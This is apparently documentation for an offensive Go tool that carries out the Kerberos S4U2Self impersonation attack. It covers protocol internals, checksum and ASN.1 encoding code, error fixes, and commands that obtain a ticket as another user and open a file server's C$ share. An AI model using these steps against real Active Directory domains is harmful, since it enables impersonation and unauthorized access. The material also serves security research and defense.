# gets4uticket - S4U2Self Deep Dive

## Overview

`gets4uticket` implements S4U2Self (Service-for-User-to-Self) to obtain service tickets impersonating other users. This is part of Microsoft's S4U (Services for User) extensions documented in MS-SFU.

## Attack Scenarios

S4U2Self is useful when you have:

1. **Machine account compromise** - Domain computer accounts can S4U2Self
2. **Service accounts with delegation** - Accounts with `TRUSTED_TO_AUTH_FOR_DELEGATION`
3. **RBCD (Resource-Based Constrained Delegation)** - After setting `msDS-AllowedToActOnBehalfOfOtherIdentity`

## Protocol Flow

```
┌──────────┐                          ┌──────────┐
│  Service │                          │   KDC    │
│ (deshi$) │                          │          │
└────┬─────┘                          └────┬─────┘
     │                                     │
     │  TGS-REQ with PA-FOR-USER           │
     │  - sname = target SPN               │
     │  - PA-FOR-USER = user to impersonate│
     │  - Signed with TGT session key      │
     │────────────────────────────────────>│
     │                                     │
     │                                     │ Verify PA-FOR-USER
     │                                     │ Check delegation rights
     │                                     │ Build ticket for impersonated user
     │                                     │
     │  TGS-REP                            │
     │  (service ticket as impersonated)   │
     │<────────────────────────────────────│
     │                                     │
     ▼                                     ▼
   Service ticket for stabby@DOMAIN
   accessing cifs/fileserver
```

## Key Implementation Details

### 1. PA-FOR-USER Structure

The PA-FOR-USER padata identifies who to impersonate:

```asn1
PA-FOR-USER-ENC ::= SEQUENCE {
    userName     [0] PrincipalName,    -- User to impersonate
    userRealm    [1] GeneralString,    -- User's realm
    cksum        [2] Checksum,         -- HMAC-MD5 checksum
    auth-package [3] GeneralString     -- "Kerberos"
}
```

### 2. S4UByteArray (Checksum Data)

The checksum is computed over a concatenation:

```go
// MS-SFU 2.2.1 S4UByteArray
checksumData := make([]byte, 4)
binary.LittleEndian.PutUint32(checksumData, uint32(1)) // NT_PRINCIPAL
checksumData = append(checksumData, []byte(username)...)
checksumData = append(checksumData, []byte(realm)...)
checksumData = append(checksumData, []byte("Kerberos")...)
```

### 3. RFC 4757 HMAC-MD5 Checksum

**Critical:** PA-FOR-USER uses a specific Kerberos HMAC-MD5 algorithm, not plain HMAC-MD5:

```go
// RFC 4757 KERB_CHECKSUM_HMAC_MD5 (type -138)
func computeKerbHMACMD5(key []byte, keyusage uint32, data []byte) []byte {
    // Step 1: Derive signing key
    ksign := hmac.New(md5.New, key)
    ksign.Write([]byte("signaturekey\x00"))
    
    // Step 2: MD5(usage_str || data)
    usageBytes := make([]byte, 4)
    binary.LittleEndian.PutUint32(usageBytes, keyusage)
    md5Hash := md5.Sum(append(usageBytes, data...))
    
    // Step 3: HMAC-MD5(ksign, md5hash)
    finalHmac := hmac.New(md5.New, ksign.Sum(nil))
    finalHmac.Write(md5Hash[:])
    return finalHmac.Sum(nil)
}
```

Key usage **17** is used for S4U2Self.

### 4. ASN.1 GeneralString Encoding

Kerberos requires GeneralString (tag 0x1b), but Go's `asn1` package uses PrintableString (tag 0x13). Manual encoding is required:

```go
// Custom ASN.1 encoding with GeneralString tags
func asn1GeneralString(s string) []byte {
    return asn1TLV(0x1b, []byte(s)) // 0x1b = GeneralString
}
```

## Implementation Challenges Fixed

| Issue | Symptom | Fix |
|-------|---------|-----|
| Wrong ASN.1 string type | `KDC_ERR_PADATA_TYPE_NOSUPP` | Manual GeneralString encoding |
| Wrong padata type | `KDC_ERR_PADATA_TYPE_NOSUPP` | PA-TGS-REQ is type 1, not 2 |
| Wrong checksum algorithm | Checksum fails | Use RFC 4757, not plain HMAC-MD5 |
| Wrong ccache principal | Ticket unusable | Save with impersonated user as principal |

## Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `KDC_ERR_PADATA_TYPE_NOSUPP` | No delegation rights | Account needs `TRUSTED_TO_AUTH_FOR_DELEGATION` |
| `KDC_ERR_BADOPTION` | User protected | Target user may have "sensitive" flag |
| `KRB_AP_ERR_BAD_INTEGRITY` | Authenticator issue | Session key mismatch |

## Usage Examples

```bash
# Impersonate stabby to access CIFS share
./gets4uticket -ccache deshi.ccache \
  -impersonate stabby@DOMAIN.COM \
  -spn cifs/fileserver.domain.com@DOMAIN.COM \
  -dc-ip 10.0.0.1 \
  -out stabby_cifs.ccache

# Use the impersonated ticket
export KRB5CCNAME=stabby_cifs.ccache
smbclient.py -k //fileserver.domain.com/C$
```

## Output

```
Successfully obtained service ticket for stabby@DOMAIN.COM
Saved to: stabby_cifs.ccache
```

The ccache contains a service ticket with:

- **Client principal**: The impersonated user (stabby)
- **Service principal**: The target service (cifs/fileserver)

## S4U2Self vs S4U2Proxy

| Feature | S4U2Self | S4U2Proxy |
|---------|----------|-----------|
| Purpose | Get ticket to self as user | Forward ticket to another service |
| Delegation type | Protocol Transition | Constrained Delegation |
| Ticket forwardable | Only with `TRUSTED_TO_AUTH_FOR_DELEGATION` | Requires forwardable ticket |
| Common use | Initial impersonation | Lateral movement |

## References

- [MS-SFU - Services for User](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/)
- [RFC 4757 - RC4-HMAC](https://datatracker.ietf.org/doc/html/rfc4757)
- [S4U2Self Abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
